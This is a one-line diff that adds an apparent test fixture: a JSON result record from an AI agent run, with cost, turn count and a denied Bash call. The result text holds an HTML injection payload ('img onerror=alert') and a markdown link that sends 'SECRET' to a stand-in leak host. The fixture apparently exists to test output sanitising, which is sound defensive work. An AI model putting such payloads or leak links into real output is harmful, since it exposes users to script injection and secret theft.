@@ -1,0 +1,1 @@
+{"type":"result","subtype":"success","is_error":false,"result":"**굵은 결과** <img src=x onerror=alert(1)> 끝 [클릭](https://leak.test/?q=SECRET)","total_cost_usd":0.004,"num_turns":2,"permission_denials":[{"tool_name":"Bash","tool_input":{"command":"ls"}}]}
